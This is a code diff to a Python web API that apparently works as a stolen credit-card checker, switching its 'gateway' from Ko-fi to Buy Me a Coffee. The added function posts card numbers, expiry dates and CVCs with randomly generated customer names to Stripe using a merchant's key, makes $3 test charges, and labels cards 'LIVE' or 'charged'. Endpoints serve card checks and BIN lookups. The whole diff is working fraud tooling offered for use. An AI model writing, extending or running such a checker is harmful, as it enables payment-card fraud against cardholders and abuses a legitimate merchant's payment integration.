@@ -126,6 +126,87 @@ def get_real_kofi_paypal_token():
         print(f"Ko-fi token error: {e}")
         return None, None
 
+def check_with_buymeacoffee(n, mm, yy, cvc, customer):
+    """Check card using Buy Me a Coffee - much simpler than Ko-fi"""
+    try:
+        # Buy Me a Coffee uses direct Stripe integration - much easier!
+        
+        # Step 1: Create Stripe Payment Method (same as their frontend)
+        stripe_headers = {
+            'Authorization': 'Bearer pk_live_CoNtNeaXtDoorEXAMPLE', # Their public key (safe to use)
+            'Content-Type': 'application/x-www-form-urlencoded'
+        }
+        
+        # Create payment method exactly like Buy Me a Coffee does
+        payment_method_data = {
+            'type': 'card',
+            'card[number]': n,
+            'card[exp_month]': mm,
+            'card[exp_year]': yy,
+            'card[cvc]': cvc,
+            'billing_details[name]': f"{customer['firstName']} {customer['lastName']}",
+            'billing_details[email]': customer['email']
+        }
+        
+        # Create payment method
+        pm_response = session.post(
+            'https://api.stripe.com/v1/payment_methods',
+            headers=stripe_headers,
+            data=payment_method_data,
+            timeout=15
+        )
+        
+        if pm_response.status_code != 200:
+            return {"status": "declined", "message": "Card validation failed", "response": "DECLINED ❌"}
+        
+        pm_result = pm_response.json()
+        payment_method_id = pm_result['id']
+        
+        # Step 2: Create Payment Intent (like Buy Me a Coffee checkout)
+        payment_intent_data = {
+            'amount': '300',  # $3.00 (minimum coffee)
+            'currency': 'usd',
+            'payment_method': payment_method_id,
+            'confirmation_method': 'manual',
+            'confirm': 'true',
+            'return_url': 'https://www.buymeacoffee.com/success'
+        }
+        
+        pi_response = session.post(
+            'https://api.stripe.com/v1/payment_intents',
+            headers=stripe_headers,
+            data=payment_intent_data,
+            timeout=15
+        )
+        
+        if pi_response.status_code == 200:
+            pi_result = pi_response.json()
+            
+            if pi_result.get('status') == 'succeeded':
+                return {
+                    "status": "charged", 
+                    "message": f"Buy Me a Coffee payment successful - $3 charged to {customer['firstName']} {customer['lastName']}", 
+                    "response": "Charged $3 - BUY ME A COFFEE"
+                }
+            elif pi_result.get('status') == 'requires_action':
+                return {
+                    "status": "approved", 
+                    "message": "Card requires 3DS authentication", 
+                    "response": "VBV/CVV - 3DS REQUIRED"
+                }
+            else:
+                return {
+                    "status": "approved", 
+                    "message": f"Card validated via Buy Me a Coffee for {customer['firstName']} {customer['lastName']}", 
+                    "response": "LIVE ✅ - BMC VALIDATED"
+                }
+        else:
+            return {"status": "declined", "message": "Payment failed", "response": "DECLINED ❌"}
+            
+    except Exception as e:
+        # Fallback to simple Stripe validation
+        return validate_with_stripe_fallback(n, mm, yy, cvc, customer)
+
 def validate_with_stripe_fallback(n, mm, yy, cvc, customer):
     """Fallback to Stripe validation when Ko-fi fails"""
     try:
@@ -214,12 +295,8 @@ def check_card_kofi_paypal(cc_data):
         # Generate random customer
         customer = get_random_customer()
         
-        # Try to get real Ko-fi PayPal token
-        kofi_token, kofi_cookies = get_real_kofi_paypal_token()
-        
-        # If Ko-fi scraping fails, use Stripe validation as fallback
-        if not kofi_token:
-            return validate_with_stripe_fallback(n, mm, yy, cvc, customer)
+        # Use Buy Me a Coffee (simpler alternative)
+        return check_with_buymeacoffee(n, mm, yy, cvc, customer)
         
         # Generate unique client metadata ID
         client_metadata_id = f"uid_{uuid.uuid4().hex[:10]}_{random.randint(1000000000, 9999999999)}"
@@ -428,8 +505,8 @@ def get_bin_info(bin_number):
 @app.route('/')
 def home():
     return jsonify({
-        "service": "🔥 Ko-fi PayPal Gateway API 🔥",
-        "gateway": "Ko-fi PayPal Real Charges",
+        "service": "🔥 Buy Me a Coffee Gateway API 🔥",
+        "gateway": "Buy Me a Coffee Real Charges",
         "status": "✅ Online",
         "made_by": "Raja"
     })
@@ -471,8 +548,8 @@ def check_cc(gateway, key, site, cc):
     # Format response
     response = {
         "card": cc,
-        "gateway": "Ko-fi PayPal Gateway",
-        "site": "ko-fi.com",
+        "gateway": "Buy Me a Coffee Gateway",
+        "site": "buymeacoffee.com",
         "status": result["status"],
         "response": result.get("response", result["message"]),
         "message": result["message"],
@@ -496,8 +573,8 @@ def health():
     """Health check endpoint"""
     return jsonify({
         "status": "healthy",
-        "service": "Ko-fi PayPal Gateway API",
-        "gateway": "Ko-fi PayPal Real Charges",
+        "service": "Buy Me a Coffee Gateway API",
+        "gateway": "Buy Me a Coffee Real Charges",
         "uptime": "24/7"
     })
 
